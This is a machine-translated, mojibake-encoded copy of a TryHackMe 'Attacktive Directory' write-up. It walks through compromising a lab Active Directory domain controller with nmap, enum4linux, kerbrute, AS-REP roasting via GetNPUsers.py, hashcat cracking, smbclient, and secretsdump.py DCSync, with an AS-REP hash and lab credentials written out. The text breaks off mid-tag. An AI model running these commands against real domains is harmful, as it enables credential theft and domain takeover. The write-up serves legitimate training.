<html>
<head>
<title>THM: Attacktive Directory</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">THM:æ”»å‡»ç›®å½•</h1>
<blockquote>åŸæ–‡ï¼š<a href="https://infosecwriteups.com/thm-attacktive-directory-7db6d7e5b0f5?source=collection_archive---------0-----------------------#2022-04-10">https://infosecwriteups.com/thm-attacktive-directory-7db6d7e5b0f5?source=collection_archive---------0-----------------------#2022-04-10</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div class="gh gi jn"><img src="../Images/0d6698d15a9fdd7735c96e32ea75c2f3.png" data-original-src="https://miro.medium.com/v2/resize:fit:670/format:webp/1*FK_tF6Ep8Wb_l1xs01gZHQ.png"/></div></figure><p id="4df9" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">åœ¨æœ¬æ–‡ä¸­ï¼Œæˆ‘é€šè¿‡æšä¸¾è¿è¡Œåœ¨å¼€æ”¾ç«¯å£ä¸Šçš„æœåŠ¡ã€æ»¥ç”¨Kerberosç‰¹æ€§ä»¥åŠæå‡æˆ‘åœ¨åŸŸæ§åˆ¶å™¨ä¸Šçš„ç‰¹æƒæ¥æ”¶é›†æ‰€æœ‰æŒ‘æˆ˜æ ‡å¿—ï¼Œé€æ­¥å®Œæˆäº†åˆ©ç”¨åŸŸæ§åˆ¶å™¨çš„è¿‡ç¨‹ã€‚è¯¥æŒ‘æˆ˜åœ¨TryHackMeå¹³å°ä¸Šå¯ç”¨ï¼Œæ ‡é¢˜ä¸ºâ€œ<strong class="jw ir">æ”»å‡»ç›®å½•</strong>ï¼Œç”±ç”¨æˆ·â€œ<a class="ae ks" href="https://tryhackme.com/p/Sq00ky" rel="noopener ugc nofollow" target="_blank"> <em class="kt">å¹½çµ</em> </a>â€åˆ›å»ºã€‚</p></div><div class="ab cl ku kv hu kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="ij ik il im in"><h1 id="852a" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">æ”¾å¼ƒ</h1><p id="9867" class="pw-post-body-paragraph ju jv iq jw b jx lz jz ka kb ma kd ke kf mb kh ki kj mc kl km kn md kp kq kr ij bi translated">æˆ‘å–œæ¬¢åœ¨ä¸€ç¯‡æ–‡ç« ä¹‹å‰æ·»åŠ ä¸€ä¸ªç®€çŸ­çš„å…è´£å£°æ˜ï¼Œä»¥é¼“åŠ±äººä»¬åœ¨é˜…è¯»æœ¬æ–‡ä¹‹å‰å°è¯•ä¸€ä¸‹è¿™ä¸ªæˆ¿é—´ï¼Œå› ä¸ºåœ¨è¿™ç¯‡æ–‡ç« ä¸­æ˜¾ç„¶ä¼šæœ‰<strong class="jw ir">å‰§é€</strong> <strong class="jw ir">ã€‚æˆ‘ç›¸ä¿¡ï¼Œå¦‚æœä½ å…ˆè‡ªå·±å°è¯•ï¼Œç„¶ååœ¨é‡åˆ°å›°éš¾æˆ–éœ€è¦æç¤ºæ—¶å†å›æ¥å†™è¿™ç¯‡æ–‡ç« ï¼Œä½ ä¼šæ›´å–œæ¬¢è¿™ä¸ªæŒ‘æˆ˜ã€‚å› æ­¤ï¼Œæ²¡æœ‰ä»»ä½•è¿›ä¸€æ­¥çš„æ‹–å»¶ï¼Œè®©æˆ‘ä»¬å¼€å§‹å§ï¼</strong></p></div><div class="ab cl ku kv hu kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="ij ik il im in"><h1 id="e7f6" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">ä»€ä¹ˆæ˜¯æ´»åŠ¨ç›®å½•ï¼Ÿ</h1><p id="2667" class="pw-post-body-paragraph ju jv iq jw b jx lz jz ka kb ma kd ke kf mb kh ki kj mc kl km kn md kp kq kr ij bi translated">Active directoryæ˜¯Microsoftå¼€å‘çš„ä¸€é¡¹æœåŠ¡ï¼Œç”¨äºç®¡ç†WindowsåŸŸç½‘ç»œå¹¶å­˜å‚¨ä¸å¯¹è±¡(å¦‚è®¡ç®—æœºã€ç”¨æˆ·ã€æ‰“å°æœºç­‰)ç›¸å…³çš„ä¿¡æ¯ã€‚è¿™ä½¿å¾—ç®¡ç†å‘˜å’Œç”¨æˆ·æ›´å®¹æ˜“æ‰¾åˆ°å’Œä½¿ç”¨å…³äºå¯¹è±¡çš„ä¿¡æ¯ã€‚åœ¨Active Directoryä¸­ï¼Œæœ‰ä¸€ä¸ªåä¸º<strong class="jw ir">åŸŸæ§åˆ¶å™¨</strong>çš„æœåŠ¡å™¨ã€‚åŸŸæ§åˆ¶å™¨æä¾›èº«ä»½éªŒè¯å’ŒæˆæƒæœåŠ¡ï¼Œå°†æ›´æ–°å¤åˆ¶åˆ°åŸŸ/æ—ä¸­çš„å…¶ä»–åŸŸæ§åˆ¶å™¨ï¼Œå¹¶å…è®¸ç®¡ç†è®¿é—®æ¥ç®¡ç†ç”¨æˆ·å¸æˆ·å’Œç½‘ç»œèµ„æºã€‚</p></div><div class="ab cl ku kv hu kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="ij ik il im in"><h1 id="1113" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">ç«¯å£æœåŠ¡æšä¸¾</h1><p id="dee6" class="pw-post-body-paragraph ju jv iq jw b jx lz jz ka kb ma kd ke kf mb kh ki kj mc kl km kn md kp kq kr ij bi translated">æˆ‘å¼€å§‹æšä¸¾ç›®æ ‡æœºå™¨ï¼Œç”¨<strong class="jw ir"> NMAP </strong>æ‰§è¡Œå¿«é€Ÿæ‰«ææ¥è¯†åˆ«ä»»ä½•æ‰“å¼€çš„ç«¯å£ã€‚</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="b6f6" class="mn lc iq mj b gy mo mp l mq mr">nmap -T5 --open -sS -vvv --min-rate=300 --max-retries=3 -p- -oN all-ports-nmap-report 10.10.253.179</span><span id="49cc" class="mn lc iq mj b gy ms mp l mq mr">PORT      STATE SERVICE        REASON<br/>53/tcp    open  domain         syn-ack ttl 125<br/>80/tcp    open  http           syn-ack ttl 125<br/>88/tcp    open  kerberos-sec   syn-ack ttl 125<br/>135/tcp   open  msrpc          syn-ack ttl 125<br/>139/tcp   open  netbios-ssn    syn-ack ttl 125<br/>389/tcp   open  ldap           syn-ack ttl 125<br/>445/tcp   open  microsoft-ds   syn-ack ttl 125<br/>464/tcp   open  kpasswd5       syn-ack ttl 125<br/>593/tcp   open  http-rpc-epmap syn-ack ttl 125<br/>636/tcp   open  ldapssl        syn-ack ttl 125<br/>3389/tcp  open  ms-wbt-server  syn-ack ttl 125<br/>5985/tcp  open  wsman          syn-ack ttl 125<br/>9389/tcp  open  adws           syn-ack ttl 125<br/>47001/tcp open  winrm          syn-ack ttl 125<br/>49664/tcp open  unknown        syn-ack ttl 125<br/>49665/tcp open  unknown        syn-ack ttl 125<br/>49666/tcp open  unknown        syn-ack ttl 125<br/>49669/tcp open  unknown        syn-ack ttl 125<br/>49672/tcp open  unknown        syn-ack ttl 125<br/>49673/tcp open  unknown        syn-ack ttl 125<br/>49674/tcp open  unknown        syn-ack ttl 125<br/>49678/tcp open  unknown        syn-ack ttl 125<br/>49684/tcp open  unknown        syn-ack ttl 125<br/>49695/tcp open  unknown        syn-ack ttl 125</span></pre><p id="0d11" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">æŸ¥çœ‹è¾“å‡ºï¼Œæˆ‘å¯ä»¥çœ‹åˆ°æœ‰24ä¸ªç«¯å£æ˜¯æ‰“å¼€çš„ã€‚æ¥ä¸‹æ¥ï¼Œæˆ‘ä½¿ç”¨NMAPæ¥è¯†åˆ«æ¯ä¸ªç«¯å£ä¸Šè¿è¡Œçš„æœåŠ¡ï¼Œå¹¶ä½¿ç”¨é€šç”¨çš„NSEè„šæœ¬æ¥æŸ¥æ‰¾æˆ‘å¯ä»¥åˆ©ç”¨çš„ä»»ä½•å¸¸è§æ¼æ´ã€‚</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="63f8" class="mn lc iq mj b gy mo mp l mq mr">nmap -sV -sC -Pn -v -oN nmap-report -p 53,80,88,135,139,389,445,464,593,636,3389,5985,9389,47001,49664,49665,49666,49669,49672,49673,49674,49678,49684,49695 10.10.253.179</span><span id="9bd5" class="mn lc iq mj b gy ms mp l mq mr">PORT      STATE SERVICE       VERSION<br/>53/tcp    open  domain?<br/>| fingerprint-strings: <br/>|   DNSVersionBindReqTCP: <br/>|     version<br/>|_    bind<br/>80/tcp    open  http          Microsoft IIS httpd 10.0<br/>| http-methods: <br/>|   Supported Methods: OPTIONS TRACE GET HEAD POST<br/>|_  Potentially risky methods: TRACE<br/>|_http-server-header: Microsoft-IIS/10.0<br/>|_http-title: IIS Windows Server<br/>88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-03-20 15:08:02Z)<br/>135/tcp   open  msrpc         Microsoft Windows RPC<br/>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn<br/>389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)<br/>445/tcp   open  microsoft-ds?<br/>464/tcp   open  kpasswd5?<br/>593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0<br/>636/tcp   open  tcpwrapped<br/>3389/tcp  open  ms-wbt-server Microsoft Terminal Services<br/>| rdp-ntlm-info: <br/>|   Target_Name: THM-AD<br/>|   NetBIOS_Domain_Name: THM-AD<br/>|   NetBIOS_Computer_Name: ATTACKTIVEDIREC<br/>|   DNS_Domain_Name: spookysec.local<br/>|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local<br/>|   Product_Version: 10.0.17763<br/>|_  System_Time: 2022-03-20T15:10:30+00:00<br/>| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local<br/>| Issuer: commonName=AttacktiveDirectory.spookysec.local<br/>| Public Key type: rsa<br/>| Public Key bits: 2048<br/>| Signature Algorithm: sha256WithRSAEncryption<br/>| Not valid before: 2022-03-19T14:57:07<br/>| Not valid after:  2022-09-18T14:57:07<br/>| MD5:   98b7 aa02 99ce 8fac 662f 00bb 1c1f 2924<br/>|_SHA-1: 6c83 7335 c65a 610b 4477 d012 08b9 2223 aed5 ebd0<br/>|_ssl-date: 2022-03-20T15:10:46+00:00; -1s from scanner time.<br/>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)<br/>|_http-server-header: Microsoft-HTTPAPI/2.0<br/>|_http-title: Not Found<br/>9389/tcp  open  mc-nmf        .NET Message Framing<br/>47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)<br/>|_http-server-header: Microsoft-HTTPAPI/2.0<br/>|_http-title: Not Found<br/>49664/tcp open  msrpc         Microsoft Windows RPC<br/>49665/tcp open  msrpc         Microsoft Windows RPC<br/>49666/tcp open  msrpc         Microsoft Windows RPC<br/>49669/tcp open  msrpc         Microsoft Windows RPC<br/>49672/tcp open  msrpc         Microsoft Windows RPC<br/>49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0<br/>49674/tcp open  msrpc         Microsoft Windows RPC<br/>49678/tcp open  msrpc         Microsoft Windows RPC<br/>49684/tcp open  msrpc         Microsoft Windows RPC<br/>49695/tcp open  msrpc         Microsoft Windows RPC</span></pre><p id="e11b" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">æˆ‘å¯ä»¥çœ‹åˆ°ä¸€äº›ç”±NMAPç¡®å®šçš„æœ‰è¶£çš„æœåŠ¡è¿è¡Œåœ¨å¼€æ”¾çš„ç«¯å£ä¸Šï¼Œæˆ‘ä»¬å¯ä»¥è¿›ä¸€æ­¥åˆ—ä¸¾ã€‚</p></div><div class="ab cl ku kv hu kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="ij ik il im in"><h1 id="f103" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">SMBæšä¸¾</h1><p id="c8e1" class="pw-post-body-paragraph ju jv iq jw b jx lz jz ka kb ma kd ke kf mb kh ki kj mc kl km kn md kp kq kr ij bi translated">æˆ‘å¯ä»¥çœ‹åˆ°ç«¯å£139å’Œ445æ˜¯æ‰“å¼€çš„ã€‚ç«¯å£139å’Œ445ç”¨äº<strong class="jw ir">è®¤è¯å’Œæ–‡ä»¶å…±äº«</strong>ã€‚æœ‰å¤šç§å·¥å…·å¯ç”¨äºæšä¸¾ç«¯å£139/445ã€‚æˆ‘ä»¬å¯ä»¥ä»ä½¿ç”¨<strong class="jw ir"> enum4linux </strong>æ¥æŸ¥æ‰¾ç›®æ ‡ä¸Šçš„è‚¡ä»½ä¿¡æ¯å¼€å§‹ã€‚</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="c95a" class="mn lc iq mj b gy mo mp l mq mr"># -a: does all simple enumeration(-U -S -G -P -r -o -n -i).<br/>$ enum4linux -a 10.10.201.126</span><span id="0653" class="mn lc iq mj b gy ms mp l mq mr">============================================ <br/>|    Getting domain SID for 10.10.201.126    |<br/> ============================================ <br/>Domain Name: THM-AD<br/>Domain Sid: S-1-5-21-3591857110-2884097990-301047963<br/>[+] Host is part of a domain (not a workgroup)</span></pre><p id="eb31" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">è¿™ä¸ºæˆ‘ä»¬æä¾›äº†ä¸€äº›æœ‰ç”¨çš„ä¿¡æ¯ï¼Œæ¯”å¦‚æœºå™¨çš„<strong class="jw ir">NetBIOS-åŸŸå</strong>ï¼Œå®ƒæ˜¯DNSåŸŸåçš„å­åŸŸã€‚</p></div><div class="ab cl ku kv hu kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="ij ik il im in"><h1 id="494c" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">RDPæšä¸¾</h1><p id="9967" class="pw-post-body-paragraph ju jv iq jw b jx lz jz ka kb ma kd ke kf mb kh ki kj mc kl km kn md kp kq kr ij bi translated">ç»§ç»­æŸ¥çœ‹ä¹‹å‰æ‰§è¡Œçš„NMAPæ‰«æçš„è¾“å‡ºï¼Œæˆ‘å¯ä»¥çœ‹åˆ°ç«¯å£3389 (RDP)ä¸Šæ³„éœ²äº†ä¸€äº›é¢å¤–çš„Windowsä¸»æœºå’ŒåŸŸä¿¡æ¯ã€‚</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="3890" class="mn lc iq mj b gy mo mp l mq mr">3389/tcp  open  ms-wbt-server Microsoft Terminal Services<br/>| rdp-ntlm-info: <br/>|   Target_Name: THM-AD<br/>|   NetBIOS_Domain_Name: THM-AD<br/>|   NetBIOS_Computer_Name: ATTACKTIVEDIREC<br/>|   DNS_Domain_Name: spookysec.local<br/>|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local<br/>|   Product_Version: 10.0.17763<br/>|_  System_Time: 2022-03-20T15:10:30+00:00</span></pre><p id="6714" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">æˆ‘è¿˜å¯ä»¥çœ‹åˆ°é¡¶çº§åŸŸå(TLD) <strong class="jw ir">ã€‚ä½¿ç”¨äº†local </strong>ï¼Œè¿™æ˜¯äººä»¬è¿‡å»å¸¸ç”¨çš„æ´»åŠ¨ç›®å½•åŸŸï¼Œä½†æ ¹æ®<a class="ae ks" href="https://wiki.samba.org/index.php/Active_Directory_Naming_FAQ" rel="noopener ugc nofollow" target="_blank">æ´»åŠ¨ç›®å½•å‘½åå¸¸è§é—®é¢˜è§£ç­”</a>ï¼Œç°åœ¨åº”è¯¥é¿å…ä½¿ç”¨ã€‚</p></div><div class="ab cl ku kv hu kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="ij ik il im in"><h1 id="038a" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">Kerberosæšä¸¾å’Œåˆ©ç”¨</h1><p id="ce38" class="pw-post-body-paragraph ju jv iq jw b jx lz jz ka kb ma kd ke kf mb kh ki kj mc kl km kn md kp kq kr ij bi translated">Kerberosæ˜¯è¿è¡Œåœ¨ç«¯å£88ä¸Šçš„Active Directoryä¸­çš„ä¸€é¡¹å…³é”®èº«ä»½éªŒè¯æœåŠ¡ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å·¥å…·<strong class="jw ir">Kerberos</strong>æ¥æšä¸¾ç”¨æˆ·ï¼Œé€šè¿‡Kerberosé¢„è®¤è¯ï¼Œå¯ä»¥å¿«é€Ÿå¼ºåˆ¶æšä¸¾æœ‰æ•ˆçš„Active Directoryå¸æˆ·ã€‚</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="68ff" class="mn lc iq mj b gy mo mp l mq mr">./kerbrute_linux_amd64 userenum --dc 10.10.253.179 -d spookysec.local -o kerbrute-user-enum userlist</span><span id="ff31" class="mn lc iq mj b gy ms mp l mq mr">2022/03/20 15:34:28 &gt;  Using KDC(s):<br/>2022/03/20 15:34:28 &gt;   10.10.253.179:88</span><span id="a20f" class="mn lc iq mj b gy ms mp l mq mr">2022/03/20 15:34:29 &gt;  [+] VALID USERNAME: james@spookysec.local<br/>2022/03/20 15:34:35 &gt;  [+] VALID USERNAME: svc-admin@spookysec.local  <br/>2022/03/20 15:34:44 &gt;  [+] VALID USERNAME: James@spookysec.local<br/>2022/03/20 15:34:47 &gt;  [+] VALID USERNAME: robin@spookysec.local<br/>2022/03/20 15:35:14 &gt;  [+] VALID USERNAME: darkstar@spookysec.local<br/>2022/03/20 15:35:37 &gt;  [+] VALID USERNAME:       administrator@spookysec.local<br/>2022/03/20 15:36:11 &gt;  [+] VALID USERNAME: backup@spookysec.local<br/>2022/03/20 15:36:32 &gt;  [+] VALID USERNAME: paradox@spookysec.local<br/>2022/03/20 15:39:16 &gt;  [+] VALID USERNAME: Robin@spookysec.local<br/>2022/03/20 15:43:20 &gt;  [+] VALID USERNAME: Administrator@spookysec.local<br/>2022/03/20 15:51:29 &gt;  [+] VALID USERNAME: Darkstar@spookysec.local<br/>2022/03/20 15:54:07 &gt;  [+] VALID USERNAME: Paradox@spookysec.local<br/>2022/03/20 16:02:39 &gt;  [+] VALID USERNAME: DARKSTAR@spookysec.local<br/>2022/03/20 16:04:59 &gt;  [+] VALID USERNAME: ori@spookysec.local<br/>2022/03/20 16:11:05 &gt;  [+] VALID USERNAME: ROBIN@spookysec.local<br/>2022/03/20 16:25:53 &gt;  Done! Tested 73317 usernames (16 valid) in 3084.883 seconds</span></pre><p id="c72b" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å‘ç°äº†16ä¸ªå¸æˆ·ï¼ŒåŒ…æ‹¬ä¸€ä¸ªæœåŠ¡ç®¡ç†å¸æˆ·(å³<strong class="jw ir"> svc-admin </strong>)å’Œä¸€ä¸ª<strong class="jw ir">å¤‡ä»½</strong>å¸æˆ·ï¼Œè¿™æ˜¯ç‰¹åˆ«æ„Ÿå…´è¶£çš„ã€‚ä½¿ç”¨æ–°å‘ç°çš„å¸æˆ·åˆ—è¡¨ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•æ»¥ç”¨Kerberosä¸­çš„ä¸€ä¸ªç‰¹æ€§ï¼Œä½¿ç”¨ä¸€ç§å«åš<strong class="jw ir">as re proposingçš„æ”»å‡»æ–¹æ³•ã€‚</strong></p><blockquote class="mt mu mv"><p id="c88a" class="ju jv kt jw b jx jy jz ka kb kc kd ke mw kg kh ki mx kk kl km my ko kp kq kr ij bi translated">å½“ç”¨æˆ·å¸æˆ·è®¾ç½®äº†â€œä¸éœ€è¦é¢„éªŒè¯â€æƒé™æ—¶ï¼Œä¼šå‘ç”Ÿé‡æ–°å‘å¸ƒã€‚è¿™æ„å‘³ç€å¸æˆ·<strong class="jw ir">åœ¨è¯·æ±‚æŒ‡å®šç”¨æˆ·å¸æˆ·ä¸Šçš„Kerberosç¥¨æ®ä¹‹å‰ä¸éœ€è¦</strong>æä¾›æœ‰æ•ˆçš„èº«ä»½è¯æ˜ã€‚</p></blockquote><p id="85b6" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">æˆ‘ä»¬å¯ä»¥åœ¨<a class="ae ks" href="https://github.com/SecureAuthCorp/impacket" rel="noopener ugc nofollow" target="_blank"> Impacket </a>ä¸­ä½¿ç”¨ä¸€ä¸ªåä¸ºâ€œ<strong class="jw ir"> GetNPUsers.py </strong>çš„å·¥å…·æ¥æ£€ç´¢Kerberosç¥¨æ®ã€‚è¿™å…è®¸æˆ‘ä»¬ä»å¯†é’¥åˆ†å‘ä¸­å¿ƒæŸ¥è¯¢å¯æ¢å¤çš„å¸æˆ·ã€‚æŸ¥è¯¢å¸æˆ·å”¯ä¸€éœ€è¦çš„æ˜¯ä¸€ç»„æœ‰æ•ˆçš„ç”¨æˆ·åï¼Œæˆ‘ä»¬ä¹‹å‰å·²ç»é€šè¿‡Kerbruteåˆ—ä¸¾è¿‡äº†ã€‚</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="fbe2" class="mn lc iq mj b gy mo mp l mq mr">python3 GetNPUsers.py spookysec.local/ -dc-ip 10.10.253.179 -usersfile kerberos-usernames -no-pass -request -outputfile kerberos-users-found</span></pre><p id="ff02" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">åœ¨è¿è¡Œâ€œ<strong class="jw ir"> GetNPUsers.py </strong>â€ä¹‹åï¼Œæˆ‘å¯ä»¥çœ‹åˆ°æ‚¨å¯ä»¥ä»svc-adminç”¨æˆ·å¸æˆ·æŸ¥è¯¢ä¸€å¼ æ²¡æœ‰å¯†ç çš„ç¥¨ã€‚</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="a931" class="mn lc iq mj b gy mo mp l mq mr">$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:408ee4a3e91ec877b931d35c56364c77$63dc9e093d6f3ddfd0074033786ed4d4d6e5f3e9f27be7f98866c0c91c4271c6c8a721eafa9e343a2b9638da64fe71d7563c31e51e6aac0686ba9025ab8ff2d41b8b24f38888cd803c70568744a12daa95cca16b73fa6bc5b20f1fb697b29fd1fe39fa0553ae07ad7e6e2f5232e306ee2abf3ee2ba8ebc704bc96f0d60cd245f96f4caa7c20c3a673fba2b25a384593b01e334560348a146d9168e1fc594b8c59e11382193bd2b3f1c421f9d5fdc61167c8f3bfa18d60fc6fca79923c16b707927719330363b593c28ccc0c7dd2c5e7696b43d45a4bc016341f773805c53f51d2b6ae4a0fa3c3280a18a9d53d9b5fd08337c</span></pre><p id="02fe" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨<strong class="jw ir"> Hashcat </strong>æ¥ç ´è§£ä»KDCä¸­æ£€ç´¢åˆ°çš„â€œKerberos 5 AS-REP etype 23â€æ•£åˆ—ã€‚</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="144e" class="mn lc iq mj b gy mo mp l mq mr">hashcat64.exe -m 18200 -a 0 hash.txt rockyou.txt -o cracked.txt</span><span id="6a5c" class="mn lc iq mj b gy ms mp l mq mr">&lt;hash&gt;:mana**********</span></pre><p id="3afe" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">è¿™ä¸ºæˆ‘ä»¬æä¾›äº†ä¸€ç»„å‡­æ®ï¼Œæˆ‘ä»¬ç°åœ¨å¯ä»¥ä½¿ç”¨è¿™äº›å‡­æ®æ¥æšä¸¾åŸŸæ§åˆ¶å™¨å¯èƒ½å‘å‡ºçš„ä»»ä½•å…±äº«ã€‚</p></div><div class="ab cl ku kv hu kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="ij ik il im in"><h1 id="21a0" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">SMBæšä¸¾(ç»­ã€‚)</h1><p id="2ebd" class="pw-post-body-paragraph ju jv iq jw b jx lz jz ka kb ma kd ke kf mb kh ki kj mc kl km kn md kp kq kr ij bi translated">ä½¿ç”¨svc-adminå‡­æ®ï¼Œæˆ‘ç°åœ¨å¯ä»¥è¿›ä¸€æ­¥åˆ—ä¸¾DCä¸Šçš„å…±äº«ã€‚æˆ‘å¯ä»¥ä½¿ç”¨å·¥å…·<strong class="jw ir"> smbclient </strong>åœ¨DCä¸Šå¸‚è‚¡ç¥¨ã€‚</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="75f5" class="mn lc iq mj b gy mo mp l mq mr">smbclient -L //10.10.200.95 -U svc-admin<br/>Enter WORKGROUP\svc-admin's password:</span><span id="4d62" class="mn lc iq mj b gy ms mp l mq mr">        Sharename       Type      Comment<br/>        ---------       ----      -------<br/>        ADMIN$          Disk      Remote Admin<br/>        backup          Disk      <br/>        C$              Disk      Default share<br/>        IPC$            IPC       Remote IPC<br/>        NETLOGON        Disk      Logon server share <br/>        SYSVOL          Disk      Logon server share</span></pre><p id="55e4" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">æˆ‘å¯ä»¥çœ‹åˆ°æœåŠ¡å™¨åˆ—å‡ºäº†å…­ä¸ªå…±äº«ï¼ŒåŒ…æ‹¬ä¸€ä¸ªåä¸º<strong class="jw ir">å¤‡ä»½</strong>çš„å…±äº«ã€‚æ­¤å…±äº«åŒ…å«ä¸€ä¸ªåä¸ºâ€œ<em class="kt"> backup_credentials.txt </em>â€çš„æ–‡æœ¬æ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«base64ç¼–ç çš„æ–‡æœ¬ã€‚è§£ç æ­¤æ–‡æœ¬å°†ä¸ºå¤‡ä»½ç”¨æˆ·å¸æˆ·æä¾›å‡­æ®ã€‚</p><figure class="me mf mg mh gt jr gh gi paragraph-image"><div class="gh gi mz"><img src="../Images/be4348947847282c20aa6368da309d95.png" data-original-src="https://miro.medium.com/v2/resize:fit:792/format:webp/1*7oUs_sEGmri0IR2DO0lZxg.png"/></div><figcaption class="na nb gj gh gi nc nd bd b be z dk translated">CyberChef Base64è§£ç å‡­è¯ã€‚</figcaption></figure></div><div class="ab cl ku kv hu kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="ij ik il im in"><h1 id="e901" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">åŸŸæƒé™æå‡</h1><p id="8f54" class="pw-post-body-paragraph ju jv iq jw b jx lz jz ka kb ma kd ke kf mb kh ki kj mc kl km kn md kp kq kr ij bi translated">æ ¹æ®æŒ‘æˆ˜æè¿°ï¼Œå¤‡ä»½å¸æˆ·å…·æœ‰å”¯ä¸€æƒé™ï¼Œå…è®¸<strong class="jw ir">æ‰€æœ‰æ´»åŠ¨ç›®å½•æ›´æ”¹ä¸æ­¤ç”¨æˆ·å¸æˆ·åŒæ­¥ï¼Œ</strong>åŒ…æ‹¬å¯†ç å“ˆå¸Œã€‚æˆ‘ä»¬å¯ä»¥åœ¨Impacketä¸­ä½¿ç”¨ä¸€ä¸ªåä¸ºâ€œ<strong class="jw ir"> secretsdump.py </strong>â€çš„å·¥å…·æ¥æ£€ç´¢è¿™ä¸ªç”¨æˆ·å¸æˆ·(ä¸åŸŸæ§åˆ¶å™¨åŒæ­¥)å¿…é¡»æä¾›çš„æ‰€æœ‰å¯†ç å“ˆå¸Œã€‚</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="f765" class="mn lc iq mj b gy mo mp l mq mr">python3 secretsdump.py spookysec.local/backup:'backup2517860'<a class="ae ks" href="http://twitter.com/10" rel="noopener ugc nofollow" target="_blank">@10</a>.10.25.158 -just-dc</span></pre><p id="d142" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">â€œ<strong class="jw ir"> secretsdump.py </strong>â€ä½¿ç”¨DRSUAPIæ–¹æ³•è·å–NTDSã€‚DITç§˜å¯†ã€‚</p><blockquote class="mt mu mv"><p id="5ddb" class="ju jv kt jw b 